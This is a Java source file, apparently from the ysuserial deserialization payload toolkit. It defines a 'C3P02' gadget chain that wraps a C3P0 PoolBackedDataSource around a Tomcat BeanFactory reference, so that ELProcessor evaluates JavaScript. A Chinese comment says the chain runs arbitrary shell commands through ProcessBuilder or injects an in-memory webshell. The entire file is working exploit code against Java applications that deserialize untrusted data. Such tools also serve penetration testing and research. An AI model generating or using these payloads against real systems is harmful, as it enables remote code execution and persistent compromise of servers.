package org.su18.ysuserial.payloads.gadgets;


import com.mchange.v2.c3p0.PoolBackedDataSource;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import org.apache.naming.ResourceRef;
import org.su18.ysuserial.payloads.ObjectPayload;
import org.su18.ysuserial.payloads.annotation.Dependencies;
import org.su18.ysuserial.payloads.util.Reflections;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.naming.StringRefAddr;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.PrintWriter;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

import static org.su18.ysuserial.payloads.handle.GlassHandler.generateClass;
import static org.su18.ysuserial.payloads.util.Utils.getJSEngineValue;


/**
 * C3P0 通过Tomcat 的 getObjectInstance 方法调用 ELProcessor 的 eval 方法实现表达式注入
 * 支持普通命令执行及内存马的打入
 */
@Dependencies({"com.mchange:c3p0:0.9.5.2", "com.mchange:mchange-commons-java:0.2.11", "org.apache:tomcat:8.5.35"})
public class C3P02 implements ObjectPayload<Object> {

	public Object getObject(String command) throws Exception {

		if (command.startsWith("EX-") || command.startsWith("LF-")) {
			command = getJSEngineValue(generateClass(command).toBytecode()).replace("\"", "\\\"");
		} else {
			command = "new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','" + command + "']).start()";
		}

		PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
		Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(command));
		return b;
	}


	private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {

		private final String SCRIPT;

		public PoolSource(String cmd) {
			this.SCRIPT = cmd;
		}

		public Reference getReference() throws NamingException {
			ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
			ref.add(new StringRefAddr("forceString", "a=eval"));
			ref.add(new StringRefAddr("a", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"" + SCRIPT + "\")"));
			return ref;
		}

		public PrintWriter getLogWriter() throws SQLException {
			return null;
		}

		public void setLogWriter(PrintWriter out) throws SQLException {
		}

		public void setLoginTimeout(int seconds) throws SQLException {
		}

		public int getLoginTimeout() throws SQLException {
			return 0;
		}

		public Logger getParentLogger() throws SQLFeatureNotSupportedException {
			return null;
		}

		public PooledConnection getPooledConnection() throws SQLException {
			return null;
		}

		public PooledConnection getPooledConnection(String user, String password) throws SQLException {
			return null;
		}
	}
}
